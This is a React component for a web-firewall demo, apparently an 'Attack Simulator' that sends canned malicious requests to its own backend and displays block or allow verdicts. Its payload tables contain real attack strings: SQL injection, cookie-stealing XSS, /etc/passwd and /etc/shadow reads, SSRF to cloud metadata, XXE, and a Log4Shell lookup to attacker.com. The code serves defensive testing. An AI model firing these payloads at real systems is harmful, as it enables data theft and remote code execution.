import { useEffect, useMemo, useRef, useState } from "react";
import { API_BASE_URL } from "../config/api";

const PAYLOADS = {
  "SQL Injection": { method: "GET", endpoint: "/search", body: null, query: "?q=SELECT * FROM users WHERE '1'='1" },
  "XSS Attack": { method: "POST", endpoint: "/comment", body: '{"text":"<script>alert(document.cookie)</script>"}', query: "" },
  "Path Traversal": { method: "GET", endpoint: "/search", body: null, query: "?q=../../etc/passwd" },
  "Command Injection": { method: "POST", endpoint: "/login", body: '{"username":"admin | cat /etc/shadow"}', query: "" },
  SSRF: { method: "GET", endpoint: "/search", body: null, query: "?q=http://169.254.169.254/latest/meta-data" },
  "XXE Injection": { method: "POST", endpoint: "/api/upload", body: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', query: "" },
  Log4Shell: { method: "GET", endpoint: "/search", body: null, query: "?q=${jndi:ldap://attacker.com/exploit}" },
  "Bad Bot": { method: "GET", endpoint: "/api/products", body: null, query: "", headers: { "User-Agent": "sqlmap/1.0" } },
  "Sensitive File": { method: "GET", endpoint: "/search", body: null, query: "?q=/etc/passwd" },
  "Header Injection": { method: "POST", endpoint: "/login", body: '{"username":"admin\\r\\nSet-Cookie: admin=true"}', query: "" },
  "Clean GET": { method: "GET", endpoint: "/search", body: null, query: "?q=hello world" },
  "Clean POST": { method: "POST", endpoint: "/login", body: '{"username":"john","password":"pass123"}', query: "" },
};

const AUTO_ATTACKS = [
  { name: "SQL Injection", method: "GET", endpoint: "/search", query: "?q=SELECT * FROM users WHERE '1'='1" },
  { name: "XSS Attack", method: "POST", endpoint: "/comment", body: '{"text":"<script>alert(document.cookie)</script>"}' },
  { name: "Path Traversal", method: "GET", endpoint: "/search", query: "?q=../../etc/passwd" },
  { name: "Command Injection", method: "POST", endpoint: "/login", body: '{"username":"admin | cat /etc/passwd"}' },
  { name: "SSRF Attempt", method: "GET", endpoint: "/search", query: "?q=http://169.254.169.254/metadata" },
  { name: "Log4Shell", method: "GET", endpoint: "/search", query: "?q=${jndi:ldap://attacker.com/exploit}" },
  { name: "Bad Bot Scan", method: "GET", endpoint: "/api/products", headers: { "User-Agent": "sqlmap/1.0" } },
  { name: "Clean Request", method: "GET", endpoint: "/search", query: "?q=hello world" },
];

export default function AttackSimulator({ onFired, fullWidth }) {
  const [type, setType] = useState("SQL Injection");
  const selected = useMemo(() => PAYLOADS[type], [type]);
  const [payload, setPayload] = useState(selected.body || selected.query || "");
  const [headers, setHeaders] = useState(JSON.stringify(selected.headers || {}, null, 2));
  const [response, setResponse] = useState(null);
  const [count, setCount] = useState(0);
  const [history, setHistory] = useState([]);
  const [anim, setAnim] = useState(false);
  const [autoRunning, setAutoRunning] = useState(false);
  const [autoStatus, setAutoStatus] = useState({ attackName: "", verdict: "" });
  const [autoStep, setAutoStep] = useState(0);
  const autoRunningRef = useRef(false);

  function syncType(next) {
    setType(next);
    const cfg = PAYLOADS[next];
    setPayload(cfg.body || cfg.query || "");
    setHeaders(JSON.stringify(PAYLOADS[next].headers || {}, null, 2));
  }

  useEffect(() => () => { autoRunningRef.current = false; }, []);

  async function executeAttack(target, nameLabel, bodyOverride, headersOverride) {
    setAnim(true);
    const start = performance.now();
    let parsedHeaders = {};
    try {
      parsedHeaders = JSON.parse(headersOverride || headers || "{}");
    } catch {
      parsedHeaders = {};
    }
    const res = await fetch(`${API_BASE_URL}${target.endpoint}${target.query || ""}`, {
      method: target.method,
      headers: { "Content-Type": "application/json", ...parsedHeaders, ...(target.headers || {}) },
      body: target.method === "GET" ? undefined : (bodyOverride ?? payload),
    });
    const data = await res.json();
    const ms = Math.round(performance.now() - start);
    const verdict = data.verdict || (res.ok ? "ALLOW" : "BLOCK");
    setResponse({ status: res.status, ms, data });
    setCount((c) => c + 1);
    setHistory((h) => [{ type: nameLabel || type, verdict, ts: new Date().toLocaleTimeString(), payload: (bodyOverride ?? payload) || target.query }, ...h].slice(0, 10));
    setAutoStatus({ attackName: nameLabel || type, verdict });
    onFired?.();
    setTimeout(() => setAnim(false), 500);
  }

  async function fire() {
    const target = PAYLOADS[type];
    await executeAttack(target, type, payload, headers);
  }

  async function runAutoAttackLoop() {
    while (autoRunningRef.current) {
      for (let i = 0; i < AUTO_ATTACKS.length && autoRunningRef.current; i += 1) {
        const attack = AUTO_ATTACKS[i];
        setAutoStep(i + 1);
        setAutoStatus((prev) => ({ ...prev, attackName: attack.name }));
        await executeAttack(attack, attack.name, attack.body || attack.query || "", JSON.stringify(attack.headers || {}, null, 2));
        if (!autoRunningRef.current) break;
        await new Promise((resolve) => setTimeout(resolve, 2000));
      }
    }
  }

  function toggleAutoAttack() {
    if (autoRunningRef.current) {
      autoRunningRef.current = false;
      setAutoRunning(false);
      return;
    }
    autoRunningRef.current = true;
    setAutoRunning(true);
    runAutoAttackLoop().finally(() => {
      autoRunningRef.current = false;
      setAutoRunning(false);
    });
  }

  return (
    <section className={fullWidth ? "panel simulator full" : "panel simulator"}>
      <div className="sim-left">
        <h3>Attack Simulator</h3>
        <select value={type} onChange={(e) => syncType(e.target.value)}>
          {Object.keys(PAYLOADS).map((k) => <option key={k}>{k}</option>)}
        </select>
        <textarea value={payload} onChange={(e) => setPayload(e.target.value)} rows={5} />
        <textarea value={headers} onChange={(e) => setHeaders(e.target.value)} rows={4} />
        {autoRunning && (
          <div className="auto-banner">
            <div className="auto-line">
              NOW ATTACKING: <span>{autoStatus.attackName || "INITIALIZING..."}</span>
            </div>
            <div className="auto-meta">
              <span>Attack {autoStep || 1}/{AUTO_ATTACKS.length}</span>
              <span className={autoStatus.verdict === "BLOCK" ? "badge-block" : "badge-allow"}>
                {autoStatus.verdict === "BLOCK" ? "THREAT DETECTED" : "ALLOWED"}
              </span>
            </div>
          </div>
        )}
        <div className="sim-actions">
          <button className={autoRunning ? "launch dimmed" : (anim ? "launch shake" : "launch")} onClick={fire} disabled={autoRunning}>LAUNCH ATTACK</button>
          <button className={autoRunning ? "launch auto stop pulse-red" : "launch auto"} onClick={toggleAutoAttack}>
            {autoRunning ? "⛔ STOP AUTO ATTACK" : "⚡ START AUTO ATTACK"}
          </button>
        </div>
        {autoRunning && <div className="auto-progress"><div style={{ width: `${(autoStep / AUTO_ATTACKS.length) * 100}%` }} /></div>}
        {response && (
          <div className={response.data.verdict === "BLOCK" ? "result blocked flash-red" : "result allowed flash-green"}>
            <div className="badge">{response.data.verdict || "ALLOW"}</div>
            <div>Response: {response.ms}ms | HTTP {response.status}</div>
            <div>Rule: {response.data?.topThreat?.ruleName || "-"}</div>
            <pre>{JSON.stringify(response.data, null, 2)}</pre>
            <small>Attack replayed {count} times</small>
          </div>
        )}
      </div>
      <div className="sim-right">
        <h4>Attack History</h4>
        {history.map((item, idx) => (
          <div key={`${item.ts}-${idx}`} className={`history-item ${item.verdict === "BLOCK" ? "h-block" : "h-allow"}`}>
            <span>{item.ts}</span>
            <span>{item.verdict}</span>
            <span>{item.payload?.slice(0, 40)}</span>
          </div>
        ))}
      </div>
    </section>
  );
}
